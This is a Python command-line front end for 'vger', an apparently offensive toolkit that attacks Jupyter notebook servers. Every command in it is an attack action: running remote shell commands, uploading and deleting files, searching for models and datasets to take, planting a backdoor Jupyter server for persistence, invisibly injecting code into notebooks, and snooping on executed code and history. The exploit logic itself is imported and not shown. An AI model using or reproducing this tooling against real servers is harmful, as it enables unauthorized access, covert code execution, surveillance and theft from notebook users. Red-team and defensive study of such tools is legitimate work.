from vger.menu import Menu
from vger.enumerate import Enumerate
from vger.exploit import Exploit
from vger.persist import Persist
import typer

app = typer.Typer(rich_markup_mode="rich")


@app.command()
def interactive():
    """
    Interactive execution for [bold red]maximum functionality[/bold red]
    """
    return Menu().main()


@app.command(rich_help_panel="Server-Level Interactions")
def terminal(host: str, secret: str, code: str):
    """
    Run a [bold red]shell command[/bold red] on the server
    """
    return Enumerate(host, secret).run_in_shell(interactive=False, code=code)


@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_list(host: str, secret: str):
    """
    List [bold red]running notebooks[/bold red] on the server
    """
    return Enumerate(host, secret).list_notebooks()


@app.command(rich_help_panel="Server-Level Interactions")
def file_list(host: str, secret: str, dir_path: str = "/"):
    """
    List [bold red]directories[/bold red] or [bold red]file contents[/bold red]
    """
    return Enumerate(host, secret).list_dir(interactive=False, dir=dir_path)


@app.command(rich_help_panel="Server-Level Interactions")
def find_models(host: str, secret: str, dir_path: str = "/"):
    """
    [bold red]Find models[/bold red] based on common file extensions
    """
    return Enumerate(host, secret).find_files_runner(
        file_type="model", interactive=False, path=dir_path
    )


@app.command(rich_help_panel="Server-Level Interactions")
def find_datasets(host: str, secret: str, dir_path: str = "/"):
    """
    [bold red]Find datasets[/bold red] based on common file extensions
    """
    return Enumerate(host, secret).find_files_runner(
        file_type="data", interactive=False, path=dir_path
    )


@app.command(rich_help_panel="Server-Level Interactions")
def file_upload(host: str, secret: str, local_path: str, remote_path: str):
    """
    [bold red]Upload a file[/bold red] to the server
    """
    return Exploit(host, secret).upload(
        interactive=False, in_path=local_path, out_path=remote_path
    )


@app.command(rich_help_panel="Server-Level Interactions")
def file_delete(host: str, secret: str, file_path: str):
    """
    [bold red]Delete a file[/bold red] on the server
    """
    return Exploit(host, secret).delete(interactive=False, path=file_path)


@app.command(rich_help_panel="Server-Level Interactions")
def backdoor_jupyter(host: str, secret: str, port: int = 7777, new_secret: str = ""):
    """
    Launch your own Jupyter server [green](it is a code execution service, after all)[/green]
    """
    return Persist(host, secret).jupyter_backdoor(
        interactive=False, port=port, secret=new_secret
    )


@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_inject(host: str, secret: str, notebook: str, code_path: str):
    """
    [bold red]Invisibly inject[/bold red] code into a notebook
    """
    return Exploit(host, secret, notebook).inject(
        interactive=False, payload_path=code_path
    )


@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_history(host: str, secret: str, notebook: str):
    """
    Dump the history of a notebook to see [bold red]previously executed code[/bold red]
    """
    return Exploit(host, secret, notebook).dump_history()


@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_snoop(host: str, secret: str, notebook: str, seconds: int = 60):
    """
    Snoop on a notebook for a specified duration to see [bold red]code as it is executed[/bold red]
    """
    return Exploit(host, secret, notebook).snoop_for(interactive=False, timeout=seconds)


@app.command(rich_help_panel="Notebook-Level Interactions")
def nb_modules(host: str, secret: str, notebook: str):
    """
    List [bold red]all available modules[/bold red] in a given notebook context
    """
    return Exploit(host, secret, notebook).list_modules()
